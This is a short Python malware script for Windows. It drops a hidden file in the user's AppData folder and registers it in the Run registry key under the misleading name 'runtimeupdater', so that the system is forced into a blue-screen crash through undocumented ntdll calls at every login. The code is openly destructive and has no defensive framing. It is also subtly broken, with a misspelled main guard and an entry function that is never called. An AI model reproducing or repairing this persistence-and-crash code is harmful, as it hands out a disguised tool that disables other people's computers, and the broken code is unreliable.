import os
import sys
import ctypes
import winreg
import os
user=os.getlogin()
script = """
def trigger():
    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
    from sys import platform

    if platform != "win32":
        return

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),  
        c_uint(1),
        c_uint(0),  
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),  
        c_ulong(0),
        POINTER(c_int)(),
        POINTER(c_int)(),
        c_uint(6),
        byref(c_uint())
    )
if name__ == "__main__":
    if os.name != "nt":
        sys.exit(0)
    trigger()
"""
def run():
    def create_bsod_script():
        with open(f"C:\\Users\\{user}\\AppData\\Local\\sysscript.py", "w") as f:
            f.write(script)

    def add_to_startup():
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        script_path = f"C:\\Users\\{user}\\AppData\\Local\\sysscript.py"
        winreg.SetValueEx(key, "runtimeupdater", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        winreg.CloseKey(key)

    def trigger_bsod():    
        if os.name != "nt":
            sys.exit(0)
        create_bsod_script()
        add_to_startup()
    trigger_bsod()
    